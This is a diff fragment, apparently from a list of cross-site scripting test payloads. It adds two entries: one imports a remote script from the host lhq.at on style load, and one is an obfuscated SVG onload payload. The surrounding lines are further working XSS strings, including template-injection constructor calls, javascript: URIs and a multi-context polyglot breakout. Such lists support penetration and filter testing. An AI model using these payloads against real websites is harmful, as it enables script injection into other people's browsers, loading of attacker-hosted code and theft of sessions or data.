@@ -6,6 +6,8 @@
   "'\"><img src=x onerror=alert()></img>",
   "{{\"\".constructor.constructor(\"alert()\")()}}",
   "javascript:alert()",
+  "<style/onload=import(/\\\\lhq.at\\xss.js?/)>",
+  "<sVg/onLy=1 onLoaD=alert``//",
   "{{$on.constructor('alert()')()}}",
   "javascript://lhq.at/\r\nalert()//",
   "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
